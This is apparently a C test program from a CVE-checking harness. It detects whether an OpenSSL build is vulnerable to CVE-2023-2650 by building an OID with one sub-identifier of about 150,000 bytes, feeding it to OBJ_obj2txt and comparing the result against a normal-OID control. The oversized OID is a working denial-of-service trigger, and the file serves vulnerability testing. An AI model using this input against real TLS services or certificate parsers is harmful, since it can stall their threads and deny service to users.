/* SPDX-License-Identifier: Apache-2.0 */
/*
 * CVE-2023-2650 - denial of service in OBJ_obj2txt() on a huge OID.
 * OBJ_obj2txt() converts each sub-identifier through a BIGNUM and prints it
 * in decimal (O(n^2) in the sub-identifier length). A certificate carrying a
 * very long unknown OID (printed by X509_NAME_print_ex / the extension-OID
 * helpers in NativeCrypto, pre-verify) stalls the thread. Fix: 9e209944b3
 * (crypto/objects/obj_dat.c) caps the encoded OID at 586 bytes.
 *
 * attack : an ASN1_OBJECT whose single sub-identifier is KKTLS_OID_BYTES long.
 * control: a normal 3-byte OID.
 *
 * Verdict (hang class, by work done): OBJ_obj2txt returning the
 * full decimal text (len > 586*3) means the O(n^2) conversion was done
 * (KKTLS_CVE_RESULT=accepted len=<n>, vulnerable however fast the host); the
 * fixed lib refuses an encoding over 586 bytes and returns -1 (rejected).
 * Not returning within the expect timeout is the safety bound (vulnerable).
 *
 * The OID length can be overridden with KKTLS_OID_BYTES (default 150000) for
 * tuning; the default comfortably exceeds the per-mode timeouts on a fast x86-64 host.
 */
#include <openssl/objects.h>
#include <openssl/asn1.h>
#include <stdlib.h>
#include "../cve_common.h"

/* Build DER for an OBJECT IDENTIFIER: tag 0x06, long-form length, content. */
static ASN1_OBJECT *make_oid(const unsigned char *content, long clen)
{
    unsigned char *der, *q;
    const unsigned char *p;
    long i, hdr, llen;
    ASN1_OBJECT *obj;

    /* number of length octets for clen (clen is large) */
    for (llen = 1; (clen >> (8 * llen)) != 0; llen++)
        ;
    hdr = 1 /*tag*/ + 1 /*0x80|llen*/ + llen;
    der = malloc(hdr + clen);
    q = der;
    *q++ = 0x06;
    *q++ = (unsigned char)(0x80 | llen);
    for (i = llen - 1; i >= 0; i--)
        *q++ = (unsigned char)((clen >> (8 * i)) & 0xff);
    memcpy(q, content, clen);
    p = der;
    obj = d2i_ASN1_OBJECT(NULL, &p, hdr + clen);
    free(der);
    return obj;
}

int main(int argc, char **argv)
{
    int ctl = cve_is_control(argc, argv);
    long n, i;
    unsigned char *content;
    ASN1_OBJECT *obj;
    char *out, det[32];
    int ret;

    if (ctl) {
        n = 3;
        content = malloc(n);
        content[0] = 0x2a; /* 1.2 */
        content[1] = 0x86;
        content[2] = 0x48; /* -> 1.2.840 */
    } else {
        const char *env = getenv("KKTLS_OID_BYTES");
        n = env ? atol(env) : 150000;
        content = malloc(n);
        content[0] = 0x2a;              /* first arc 1.2 */
        for (i = 1; i < n - 1; i++)
            content[i] = 0xff;          /* one gigantic sub-identifier */
        content[n - 1] = 0x7f;          /* terminating (high bit clear) */
    }

    obj = make_oid(content, n);
    if (obj == NULL) {
        /* setup failed: OBJ_obj2txt was never called, so this run proves
         * nothing - exit non-zero without a marker (harness: ERROR) */
        printf("d2i_ASN1_OBJECT failed (encoding rejected)\n");
        free(content);
        return 1;
    }

    out = malloc(1 << 20);
    out[0] = '\0';
    cve_call("OBJ_obj2txt");
    ret = OBJ_obj2txt(out, 1 << 20, obj, 1);   /* stalls here on the unfixed code */
    cve_reached("OBJ_obj2txt");
    printf("OBJ_obj2txt returned %d (len %zu)\n", ret, strlen(out));
    snprintf(det, sizeof(det), "len=%d", ret);
    if (ctl)
        cve_result(ret == 7 && strcmp(out, "1.2.840") == 0 ? "accepted" : "unexpected", det);
    else if (ret < 0)
        cve_result("rejected", det);
    else if (ret > 586 * 3)   /* far more digits than any legal OID */
        cve_result("accepted", det);
    else
        cve_result("unexpected", det);

    free(out);
    free(content);
    ASN1_OBJECT_free(obj);
    return 0;
}
